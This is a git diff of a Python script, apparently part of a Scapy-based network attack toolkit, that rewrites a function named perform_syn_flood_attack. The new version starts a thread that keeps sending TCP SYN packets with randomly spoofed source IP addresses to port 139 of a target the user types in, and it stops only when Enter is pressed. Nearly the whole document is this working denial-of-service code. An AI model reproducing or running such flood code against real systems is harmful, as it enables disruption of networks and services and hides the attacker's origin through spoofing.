@@ -192,19 +192,34 @@ def perform_os_discovery(ip_addr=None):
 
 
 #(11) Code to perform syn flood attack
-def perform_syn_flood_attack(ip_addr=None, port_range=None):
+def perform_syn_flood_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
-    #if not port_range:
-        # Get input from the user
-    #    port_range = input("Enter the port range to scan (e.g. 1-1000): ")
-    
     packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=139, flags="S")
-    send(packet, loop=1, inter=0.005)
 
-    return "SYN flood attack performed on " + ip_addr + " from " + port_range
+    # Create a flag to indicate whether to stop the attack
+    stop_flag = threading.Event()
+
+    def send_packet():
+        while not stop_flag.is_set():
+            send(packet, verbose=0)
+    
+    # Crea un thread per eseguire l'attacco SYN flood
+    attack_thread = threading.Thread(target=send_packet)
+    attack_thread.start()
+
+    # Wait for user input to stop the attack
+    input("Press Enter to stop the attack...")
+
+    # Set the stop flag to stop the attack
+    stop_flag.set()
+
+    # Wait for the attack thread to finish
+    attack_thread.join()    
+
+    return "SYN flood attack performed on " + ip_addr
 
 
 #(12) Code to perform icmp flood attack
